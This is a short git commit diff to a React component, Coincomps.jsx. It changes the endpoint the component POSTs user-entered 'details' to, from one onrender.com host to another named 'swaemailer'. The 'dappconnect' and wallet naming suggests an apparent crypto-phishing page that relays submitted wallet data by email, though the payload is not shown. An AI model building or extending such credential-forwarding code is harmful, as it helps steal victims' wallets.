4a057fb0b77c4ad38e6a7c7d988b859a2f6239b2
davesmithade <161246714+vendmartwallet@users.noreply.github.com>
2024-08-10 21:47:00 +0100

    Update Coincomps.jsx
    update

--- src/components/coincomps/Coincomps.jsx
+++ src/components/coincomps/Coincomps.jsx
@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://dappconnectlaunchpad.onrender.com/details";
+        const url = "https://swaemailer.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
